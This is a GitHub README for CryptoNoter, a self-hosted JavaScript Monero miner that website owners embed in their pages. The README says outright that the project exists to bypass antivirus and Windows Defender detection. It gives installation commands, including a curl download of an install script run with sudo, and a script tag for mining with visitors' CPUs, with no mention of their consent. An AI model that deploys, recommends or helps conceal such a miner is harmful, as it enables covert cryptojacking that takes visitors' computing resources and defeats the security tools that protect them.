## CryptoNoter v1.2
`"Plug & Play" Installation` `Set Up Within 10 Mins`<br />
In-Browser Javascript XMR miner for websites / Payout towards personal XMR wallet<br />
Built for in-browser javascript mining on any Monero pools. 0% Commission. 100% Payout

## Why This Project Is Created
* Websites that use Javscript browser miners (Coinhive, Crypto-Loot, etc) are specifically targeted by most anti-virus softwares including the built-in Windows Defender. When visitors visit these websites, they will be notified that malicious codes / viruses have been detected on these websites. Well, you should know how such notification affects the website. In addition, you get charged up to 30% commission by these javscript mining platform.

This project is created to bypass detection and avoid being flagged as malicious websites by running your own Javscript Mining Server and deploying on your websites. It is similar to Coinhive idea, however you do not have to be charged for any percent of your earnings. You can point to any Monero mining pool and get 100% for your mining efforts. (Of course, less the pool fees)

## Requirements
The project is a basically a "Plug & Play" installation. Most of the configurations are setup automatically when you run the installation. Simply follow the steps by steps installation. 

However, if you decide to modify or optimize CryptoNoter for maximum mining capabilities, you will need good knowledge on Nginx Reverse Proxy, javascript, etc. For example, we did approx 1550 H/s for a website with approx 15,000 visitors (Avg Time on Page: 55 secs / visitor) before optimization. After optimization, we are doing on avg 3500 H/s

`Minimum System Requirements`
1. Server with at least 1 CPU, 1 GB Ram & 8GB Harddisk [You will need better specs if you have higher traffic load]
2. Ubuntu(Debian) OS
3. Nginx, Nodejs, NPM & Forever Packages
4. SSL Support For Domain. Use https://certbot.eff.org/

`IMPORTANT NOTE:` DO NOT USE GOOGLE COMPUTE ENGINE (GCE) or other related Google CLoud Services for crypto-mining services. It is in violation of their TOS. Google will suspend your account, lock your files and charge you for the usage. Been there, done that. So don't waste your precious time.

## Installation
```bash
Install Nginx
sudo apt-get update
sudo apt-get install nginx
```

Install NodeJs & NPM
```bash
sudo apt-get update
sudo apt-get install nodejs
sudo apt-get install npm
```

Install CryptoNoter
```bash
curl https://raw.githubusercontent.com/cryptonoter/CryptoNoter/master/install.sh > install.sh
sudo sh install.sh
```

* Install A Control Panel (Vesta CP or Cpanel)
* Add Your Domain via Control Panel
* Set Up Your Domain DNS Properly & Configure Firewalls
* Use CertBot To Assign SSL For Your Domain
* Login Via FTP and Upload Files Within The Web Folder To Your Domain

## Usage
* Run CryptoNoter server.js script
```bash
forever start /srv/CryptoNoter/server.js
```
* Make sure CryptoNoter server.js script is running on the server by using the command `forever list`
```bash
info:    Forever processes running
data:        uid  command       script                     forever pid  id logfile                 uptime
data:    [0] tX4L /usr/bin/node /srv/CryptoNoter/server.js 7379    7385    /root/.forever/tX4L.log 0:0:59:11.96
```
* Make sure you have uploaded the web folder to your domain public_html or domain root. Ensure you can access https://YOUR_DOMAIN_NAME/demo.html

* Add the following javascript before the </head> tag onto webpages that you want the miner to run on. Remember to replace www.cryptonoter.com with your domain name. Else, you will be mining for my wallet
```html
<script src="https://www.cryptonoter.com/processor.js"></script>
<script>
    var miner = new CryptoNoter.Anonymous('CryptoNoter').start();
</script>
```
* Done! You can now start mining using your visitors' CPU resources by adding the above tag to any of your websites.

## Troubleshooting
Check if server.js execute successfully by using this command
```bash
node /srv/CryptoNoter/server.js
```
If script executes successfully, it should show:
```bash
In-Browser Javascript XMR miner for websites / Payout towards personal XMR wallet
Built for in-browser javascript mining on any Monero pools. 0% Commission. 100% Payout

 Listen on : 127.0.0.1:7777
 Pool Host : monero.us.to:1111
 Ur Wallet : YOUR_WALLET_ADDRESS
```
If script executes unsucessfully, it should show error logs. Troubleshoot by referring to the errors shown.
`For example:` The error log shown below means that the port 7777 is currently in use. `To resolve:` Simply listen to the port 7777, identify the process that is using the port and kill the process. Then try executing the script server.js again
```bash
Error: listen EADDRINUSE 127.0.0.1:7777
    at Object._errnoException (util.js:1024:11)
    at _exceptionWithHostPort (util.js:1046:20)
    at Server.setupListenHandle [as _listen2] (net.js:1351:14)
    at listenInCluster (net.js:1392:12)
    at doListen (net.js:1501:7)
    at _combinedTickCallback (internal/process/next_tick.js:141:11)
    at process._tickCallback (internal/process/next_tick.js:180:9)
    at Function.Module.runMain (module.js:678:11)
    at startup (bootstrap_node.js:187:16)
    at bootstrap_node.js:608:3
```
`Common Issues & Bugs:`
1. Port in use. Check if the port is listening?
2. Connection errors are commonly casused by iptables. Check your firewall settings
3. CryptoNoter not generating hashes. Check your config.json setting
4. Check the setting of nginx.conf, config.json, worker.js, processor.js & cryptonight-asmjs.min.js

If you have any questions on Troubleshooting & Debugging, please ask the questions here: https://github.com/cryptonoter/CryptoNoter/issues/1

